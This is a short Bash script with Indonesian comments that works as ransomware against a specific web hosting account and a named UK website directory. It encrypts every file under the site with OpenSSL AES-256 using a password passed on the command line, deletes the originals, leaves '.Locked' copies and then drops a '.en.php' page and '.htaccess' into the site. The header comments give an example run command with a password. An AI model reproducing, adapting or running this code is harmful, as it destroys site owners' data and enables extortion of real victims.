#sed -i 's/\r//' ren.sh
#bash ren.sh @rijal@123
#!/bin/bash

# Fungsi untuk mengenkripsi file
encfile() {
    local file=$1
    local pass=$2
    if [ -f "$file" ]; then
        # Menggunakan OpenSSL untuk mengenkripsi file dengan password yang diberikan
        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.Locked" -pass pass:"$pass" && rm "$file"
        echo "🔒 $file telah Locked🔒"
    else
        echo "❌ File $file tidak ditemukan"
    fi
}

# Fungsi untuk mengenkripsi seluruh isi direktori kecuali subdirektori tertentu
encdir() {
    local dir=$1
    local pass=$2
    local exclude_dir_full="/home/hmfodlyc/storybeforeglory.co.uk/.tmb"  # Direktori yang dikecualikan

    if [ -d "$dir" ]; then
        # Mencari seluruh file dalam direktori, mengecualikan direktori css dengan path lengkap
        find "$dir" -type f ! -path "$exclude_dir_full*" -print | while read -r file; do
            encfile "$file" "$pass"
        done
        echo "✅ Direktori $exclude_dir_full dikecualikan dari Locked🔒"
    else
        echo "❌ Direktori $dir tidak ditemukan"
    fi
}

# Memeriksa apakah password diberikan melalui input
if [ -z "$1" ]; then
    echo "Password harus diberikan sebagai argumen."
    exit 1
fi

# Password untuk enkripsi
password=$1

# Direktori target
target_dir="/home/hmfodlyc/storybeforeglory.co.uk/"

# Menjalankan enkripsi untuk seluruh direktori, kecuali subdirektori yang dikecualikan
encdir "$target_dir" "$password"

# Menyalin file index.php dan .htaccess, jika ada
if [ -f ".en.php" ]; then
    cp .en.php "$target_dir"
    echo "✅ .en.php telah disalin"
else
    echo "❌ .en.php tidak ditemukan"
fi

if [ -f ".htaccess" ]; then
    cp .htaccess "$target_dir"
    echo "✅ .htaccess telah disalin"
else
    echo "❌ .htaccess tidak ditemukan"
fi

echo "🔒Locked selesai🔒"
